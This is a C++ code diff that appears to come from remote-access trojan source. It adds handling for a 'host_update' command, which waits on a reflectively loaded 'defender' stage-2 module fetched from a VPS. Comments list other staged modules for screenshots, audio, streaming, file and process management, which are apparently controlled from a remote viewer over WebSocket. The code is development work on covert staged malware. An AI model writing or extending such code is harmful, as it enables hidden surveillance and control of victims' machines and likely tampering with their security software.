@@ -1531,6 +1531,30 @@ static void handle_command(const std::string& msg_str) {
             return;
         }
 
+        // ── Special-case: host_update must survive a fresh-service-start
+        //    race where defender.bin hasn't finished prefetching yet.
+        // Normal dispatch would return false (module not cached) and the
+        // viewer's `.catch(()=>{})` silently swallows the failure, leaving
+        // user staring at a stuck progress bar. Offload to a worker thread
+        // so the WSS pump stays free to deliver the stage2_blob response,
+        // and synchronously wait (up to 15s) for defender to be ready
+        // before dispatching. ──
+        if (cmd == "host_update") {
+            std::string msg_copy = msg_str;
+            std::thread([msg_copy]() {
+                if (stage2::Registry::inst().ensure_module_ready_sync("defender", 15000)) {
+                    stage2::Registry::inst().dispatch("host_update", msg_copy);
+                } else {
+                    // Blob fetch timed out. Report a useful error.
+                    std::string id = json_get(msg_copy, "id");
+                    std::string r = "{\"id\":\"" + json_escape(id) +
+                                    "\",\"ok\":false,\"error\":\"defender module not available (VPS unreachable?)\"}";
+                    if (g_ws && g_ws->is_connected()) g_ws->send_text(to_utf8(r));
+                }
+            }).detach();
+            return;
+        }
+
         // ── Stage-2 dispatch ──
         // Commands implemented by reflectively-loaded modules (screenshot,
         // audio, stream, filemgr, procmgr, defender) go through here first.
